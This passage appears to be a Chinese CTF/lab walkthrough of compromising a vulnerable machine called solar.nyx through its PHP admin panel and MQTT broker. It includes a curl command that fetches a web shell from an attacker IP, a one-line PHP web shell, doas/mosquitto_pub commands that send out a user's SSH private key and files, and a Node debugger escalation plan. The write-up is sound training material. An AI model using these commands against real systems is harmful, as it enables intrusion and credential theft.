        header('Location: server.php');
        exit;
    }

    // Handle command execution
    if (isset($_POST['execute']) && isset($_POST['command_file'])) {
        $commandFile = 'commands/' . basename($_POST['command_file']);
        if (file_exists($commandFile)) {
            $commandJson = file_get_contents($commandFile);
            $command = json_decode($commandJson, true);

            if (isset($command['cmd'])) {
                $output = shell_exec(escapeshellcmd($command['cmd']));
                $mqttHost = 'localhost';
                $mqttTopic = 'server/command/output';
                $mqttMessage = json_encode([
                    'name' => $command['name'],
                    'command' => $command['cmd'],
                    'output' => base64_encode($output)
                ]);
                $mqttCommand = sprintf(
                    'mosquitto_pub -h %s -t %s -m %s -u '.$secret['user'].' -P \''.$secret['pass'].'\'',
                    escapeshellarg($mqttHost),
                    escapeshellarg($mqttTopic),
                    escapeshellarg($mqttMessage)
                );
                shell_exec($mqttCommand);
            } else {
                $output = "Invalid command format in the file.";
            }
        } else {
            $output = "Command file not found.";
        }
    }

    // Get list of command files
    $commandFiles = array_diff(scandir('commands'), ['.', '..', 'php-info.php']);

    // Show admin panel if user is authenticated
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <title>Admin Panel</title>
        <link rel="stylesheet" href="/style.css">
        <link rel="stylesheet" href="/styleadmin2.css">
    </head>

    <body>
        <main>
            <h1>Server Administration Panel</h1>
            <p>This is a server administration or management page.</p>
            <p style="text-align:left;">Server contains two websites:
            <ul>
                <li style="text-align:left;"><strong>sunfriends.nyx</strong> a forum about solar energy.</li>
                <li style="text-align:left;"><strong>solar.nyx</strong> a real time control panel for the community solar
                    installation.</li>
            </ul>
            </p>
            <form method="post" action="">
                <input type="submit" name="logout" value="Logout">
            </form>
            <h2>Server Information</h2>
            <form method="post" action="">
                <label for="command_file">Select Command:</label>
                <select name="command_file" id="command_file" required>
                    <?php foreach ($commandFiles as $file): ?>
                        <option value="<?php echo htmlspecialchars($file); ?>"><?php echo htmlspecialchars($file); ?></option>
                    <?php endforeach; ?>
                </select>
                <br><br>
                <input type="submit" name="execute" value="Execute">
            </form>
            <?php if (isset($output)): ?>
                <h3>Command Output:</h3>
                <pre><?php echo htmlspecialchars($output); ?></pre>
            <?php endif; ?>
        </main>
    </body>

    </html>
    <?php
} else {
    // Show login form if user is not authenticated
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login - Solar Community Server</title>
        <link rel="stylesheet" href="/style.css">
        <link rel="stylesheet" href="/styleadmin.css">

    </head>

    <body>
        <!-- Main container for the login form -->
        <div class="login-container">
            <!-- Page header -->
            <h2>Admin Login</h2>

            <!-- Subheader to clarify the purpose of the login -->
            <h3>Administration Server for <strong>solar.nyx</strong> and <strong>sunfriends.nyx</strong></h3>

            <!-- Display error message if present -->
            <?php if (isset($error)): ?>
                <p class="error"><?php echo $error; ?></p>
            <?php endif; ?>

            <!-- Login form -->
            <form method="post" action="">
                <!-- Username input -->
                <label for="username">Username</label>
                <input type="text" name="username" id="username" required>

                <!-- Password input -->
                <label for="password">Password</label>
                <input type="password" name="password" id="password" required>

                <!-- Submit button -->
                <input type="submit" value="Login">
            </form>

            <!-- Footer link to the main site -->
            <div class="footer-link">
                <p>Not an admin? <a href="/">Return to Solar Community Forum</a></p>
            </div>
        </div>
    </body>

    </html>
    <?php
}
?>
```

## 也是写明文凭据在校验代码里做身份校验

![](images/2026-10-23-10-38-35-image.png)

### 但是这个server.php页面我们是可以访问的

![](images/2026-10-23-10-39-09-image.png)

##### 进入后是个命令执行，看systemd的状态信息的，不过只能选择她给的命令，无法自定义输入

![](images/2026-10-23-10-42-50-image.png)

前端发来文件，提取里面的 `cmd` 字段，然后直接丢给 Linux 系统去执行（`shell_exec`）

**隐藏的 MQTT 通信**  
执行完命令后，它还会把输出结果打包成 JSON，通过 `mosquitto_pub` 发送到 MQTT 的 `server/command/output` 主题里

### 下面是分析

```bash
// 1. 接收用户提交的文件名，并拼接成路径
$commandFile = 'commands/' . basename($_POST['command_file']); 

// 2. 检查文件是否存在
if (file_exists($commandFile)) {
    // 3. 读取这个文件的全部内容
    $commandJson = file_get_contents($commandFile); 
    // 4. 把读到的 JSON 字符串解析成 PHP 数组
    $command = json_decode($commandJson, true);

    // 5. 检查数组里有没有 'cmd' 这个键
    if (isset($command['cmd'])) {
        // 6. 最致命的一步：把 'cmd' 的值交给系统执行！
        $output = shell_exec(escapeshellcmd($command['cmd']));
```

### 

### 上面源码表明无法从web端进行命令注入，那就换入口

```bash
// 1. 准备连接的 MQTT 服务器地址和主题
$mqttHost = 'localhost';
$mqttTopic = 'server/command/output';

// 2. 把刚才命令执行的结果，打包成 JSON
$mqttMessage = json_encode([
    'name' => $command['name'],
    'command' => $command['cmd'],
    'output' => base64_encode($output) // 注意这里把输出结果 base64 编码了
]);

// 3. 拼接出一段 Linux 命令行字符串
$mqttCommand = sprintf(
    'mosquitto_pub -h %s -t %s -m %s -u '.$secret['user'].' -P \''.$secret['pass'].'\'',
    escapeshellarg($mqttHost),
    escapeshellarg($mqttTopic),
    escapeshellarg($mqttMessage)
);

// 4. 再次调用系统命令，执行这段 MQTT 发送命令
shell_exec($mqttCommand);
```

### `mosquitto_pub` 是Linux 下用来发送 MQTT 消息的官方命令行工具

![](images/2026-10-23-10-55-54-image.png)

#### 发送到这个主题

![](images/2026-10-23-10-57-24-image.png)

#### 用这个身份向mqtt的broker发订阅信息的，因为之前用这个身份登录web,然后执行命令，然后将执行结果打包一份，发给mqtt,mqtt需要认证，自然用的这个身份，根据server.php源码上下文可以推测出

![](images/2026-10-23-11-12-37-image.png)

### 第二个命令执行入口:

#### 因此，我们可以用这个身份连接mqtt服务端

#### 既然web是个输入端，.php调用系统函数执行，把结果发送到/server/command/output 这个Topic,

#### 那mqtt客户端是否也有一个输入点，mqtt服务端调用系统函数执行，然后输出到/server/command/output Topic

### 这个输入点就需要进行Fuzzing了

### 可能是server/command/input,也可能是 input 还可能是 server/np,这些Topic

### 需要写脚本批量扫，如果上传到一个存在的Topic，会显示内容的

### 之前看web端是用cmd这个参数来接收命令的，

### 可以试一下mqtt爆破时候用”cmd“字段来传参

## 这里直接看作者答案了，真正处理的Topic是 server/command/new

![](images/2026-10-23-11-57-17-image.png)

##### 注意权限隔离，无法用admin的mqtt账号去向server/command/new发送消息

#### 用ai生成上传内容到Topic的脚本

```bash
import paho.mqtt.client as mqtt
import ssl
import json
import time

# 1. 放入你想要爆破的主题字典
topics = [
    "server/command/new",
    "server/command/add",
    "server/command/info",
    "server/command/exec",
    "server/command/cmd",
    "test",
    "status"
]

# 2. 准备要发送的 Payload (注意必须带上 name 字段，否则会报错)
payload = {
    #"name": "fuzzer-test",
    "cmd": "whoami"
}
json_data = json.dumps(payload)

client = mqtt.Client(client_id="ssrf-tester", transport="websockets", protocol=mqtt.MQTTv311)
client.username_pw_set("5up3r", "bloods")
client.ws_set_options(path="/wss/")
client.tls_set(cert_reqs=ssl.CERT_NONE)
client.tls_insecure_set(True)

print("[*] 正在连接靶机...")
client.connect("www.solar.nyx", 443, 60)

# 💡 关键：启动后台网络循环，否则消息发不出去
client.loop_start()

print("[*] 开始爆破 Topic...")
for topic in topics:
    print(f"[+] Sending to: {topic}")
    # 3. 将主题变量填入 publish
    client.publish(topic, json_data)
    # 💡 关键：停顿 0.5 秒，防止发太快被服务器判定为洪水攻击或丢包
    time.sleep(0.5)

print("[*] 发送完毕，等待 2 秒让网络把数据彻底传完...")
time.sleep(2)

client.disconnect()
client.loop_stop()
print("[+] OK，爆破结束。")
```

### 出现订阅的主题了

![](images/2026-10-23-12-27-15-image.png)

### 告诉我们缺少name字段

![](images/2026-10-23-12-31-06-image.png)

## 第二次没报错也没有出现server/command/output这Topic来回显输出

### 大概是做了过滤吧，下面是server.php的过滤源码，用了escapeshellcmd（）这个函数来过滤，那mqtt也应该用了过滤

```bash
$output = shell_exec(escapeshellcmd($command['cmd']));
```

#### mqtt服务端本身不具有处理消息的能力，只是个中转站

- **后台脚本订阅了主题**：服务器上跑着一个 `daemon.php` 或类似的脚本，它一直连着 MQTT Broker，监听 某个 Topic

- **接收并提取**：一收到你发的 JSON，它提取出里面的 `"cmd"` 字段。

- **落入同一个陷阱**：这个后台脚本为了安全，在把命令交给系统执行时，也调用了 PHP 的 `escapeshellcmd()` 函数

### 猜想后台处理是不是也扔给这个php程序来处理的，那过滤也是用的escapeshellcmd（）

### escapeshellcmd（）过滤规则

- 允许空格**，允许常规的字母和数字**。

- 允许单纯的双引号和单引号

#### 请求个反弹shell

payload 

```bash
{
  "name": "fwonowwn",
  "cmd": "curl -o /var/www/solar.nyx/exp.php http://192.168.56.1:8000/shell.php"
}
```

#### 批量发,因为不知道哪个Topic可以被处理

![](images/2026-10-23-13-04-00-image.png)

### `www-data`权限非常低,下载的文件，可能也没权限放在目录

### 回到刚才的record页面的后端index.php源码, 说明允许www-data用户**随意增删文件**

```bash
$files = glob($directory . '*.json');
usort($files, ...);
$filesToKeep = array_slice($files, 0, 10);
$filesToDelete = array_slice($files, 10);
// 删除旧的 .json 文件
```

#### 所以需要把木马放在/var/www/solar.php/records

### 但是上传到/server/command/new里面的请求我的服务器的命令一直不执行，所以我转到了server.php这个页面，并得出以下结论

#### 上面一些推测是错误的，下面是经过实验后的校验，得出正确的推论

### 先把内容上传到server/command/new Topic ，然后web的server.php页面命令执行框，可以选择这个命令文件，点击执行，会向攻击者请求木马，然后执行，最后打印在server/command/output 这个Topic里

![](images/2026-10-23-13-41-48-image.png)

### 真实攻击中，刚刚发现的现象叫做 **“异步任务队列（Asynchronous Task Queue）”**

如果是一个有经验的开发人员设计，他**绝对不会**让 MQTT 直接触发系统命令执行，因为那样太危险了（一旦 MQTT 被攻破，服务器直接沦为肉鸡）。

他的真实设计逻辑是这样的：

1. **web前端或 MQTT客户端 只是“提需求”**：收到命令后，只写一个配置文件（`.json`）放入 `commands/` 目录。

2. **后台人工审核（或定时脚本）**：管理面板（`server.php`）读取这个目录，让你确认后再执行。

#### 因此，真正的控制命令执行的后台在server.php页面，server/command/new,只是让那个文件存在，web页面才能出现那个命令的选项，

#### 开始上传反弹木马

![](images/2026-10-23-14-03-50-image.png)

```bash
{
  "name": "hacker",
  "cmd": "curl -o /var/www/solar.nyx/records/ppppppp.php http://192.168.56.1:8000/web.php"
}
```

### 出现了

![](images/2026-10-23-14-08-16-image.png)

#### 成功下载木马

![](images/2026-10-23-14-09-19-image.png)

## web访问触发,   没有收到shell回连，但是给的ok回显说明存在这个文件的，可能是我们的木马在靶机的环境不行

![](images/2026-10-23-14-13-46-image.png)

#### 后来才发现是我的server.py开http服务 这个脚本的问题

### 那就用python3 开吧

### 终于成功了

```bash
<?php system($_GET['code']); ?>
```

![](images/2026-10-23-14-47-16-image.png)

![](images/2026-10-23-14-51-48-image.png)

#### 收到了

#### 目标只有socat,

### 能进用户的目录，但是没有权限访问文件

#### 有个mysql服务，只允许内网访问，

![](images/2026-10-23-15-11-04-image.png)

#### 没有密码登录不上

`/etc/doas.conf` 是 Linux 系统下 `doas` 工具的配置文件。`doas` 是 `sudo` 的一个轻量级替代品（在 OpenBSD 系统里很常见，现在很多精简版 Linux 也在用）。

![](images/2026-10-23-15-15-54-image.png)

![](images/2026-10-23-15-21-54-image.png)

#### 把这两个文件用

#### /usr/bin/mosquitto_pub 发送到broker的某个主题上，我们去broker 看内容

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/user.txt
```

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/note.txt
```

![](images/2026-10-23-15-27-25-image.png)

#### 结合之前爆破出的一个存在主题，或者直接发送到data

看不懂

![](images/2026-10-23-15-30-51-image.png)

```bash
c25e7b68dd71d1ca9d8f86da2df12035
```

```bash
You just have to remember the one that starts with love and ends with a number

你只需要记住那个以 love 开头，并且以数字结尾
```

### 这是密码提示

#### 偷私钥

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/.ssh/id_ed25519
```

![](images/2026-10-23-15-41-58-image.png)

#### 还要密码短语，大概就是上面给的那串加密字符串

```
c25e7b68dd71d1ca9d8f86da2df12035
```

![](images/2026-10-23-15-46-26-image.png)

#### 上面那个字符串破解不出的，换路

#### 继续用`doas -u lenam /usr/bin/mosquitto_pub -f`去读本地文件，需要写脚本批量读，需要通过回显类型，来判断文件是否存在，进行过滤

![](images/2026-10-23-19-01-44-image.png)

### 把错误重定向到输出就能用行来判断文件类型

![](images/2026-10-23-19-03-54-image.png)

#### 脚本就不写了，passphrase在`/home/lenam/.local/share/nano/search_history`这个文件里

![](images/2026-10-23-19-35-53-image.png)

```
CzMO48xpwof8nvQ6JUhF
```

#### 找到两个GPG密钥

![](images/2026-10-23-19-49-48-image.png)

# 回到刚才我们在user.txt拿到的，字符串，可能就是GPG的Passphrase

```
c25e7b68dd71d1ca9d8f86da2df12035
```

# 都失败了

```bash
gpg -d user.gpg
```

![](images/2026-10-23-20-03-20-image.png)

![](images/2026-10-23-20-02-00-image.png)

```
You just have to remember the one that starts with love and ends with a number
```

### 上面那个提示是用来破解gpg的passphrase的

#### 不过**用字典去暴力跑 GPG 的 Passphrase，在现实中，成功率无限趋近于零**，现代GPG的加密算法超级计算久

#### 下载这两个PGP密钥到本地![](images/2026-10-23-20-56-49-image.png)

### 需要用Hashcat 官方工具 `gpg-ocb-aes2hashcat.py`将.gpg密钥格式转换成hashcat能识别的格式

`loveboy1`是passphrase

### 一个passphrase解开3个

![](images/2026-10-23-20-20-09-image.png)

- **`personal/private_id.gpg` -> `CzMO48xpwof8nvQ6JUhF`** (这是刚才用密钥登录ssh输入的`passphrase`

- **`personal/user.gpg` -> `qiFQI7buDp7zIQnAymEY`** (这是 `lenam` 用户密码)。

### 这个提权是真的难，其实可以一个内核漏洞脚本直接打穿的


# Node.js 是一个让 JavaScript 能够在浏览器之外运行的运行时环境。

```bash
julian     25890  3.4  3.9 1053772 79640 ?       Ssl  12:04   0:01 /home/julian/.nvm/versions/node/v22.7.0/bin/node /home/julian/.local/bin/demoadm/login.js
```
# 这个julian运行了一个node.js,我们用doas kill来发送调试信号
`permit lenam as julian cmd /bin/kill`

```
node 进程收到kill的 SIGUSR1
  → 自动开启调试模式
  → 默认监听 localhost:9229
  → 可以用 node inspect 连进去
  → 在调试器里执行任意 JS
  → 以 julian 身份拿到 shell
```


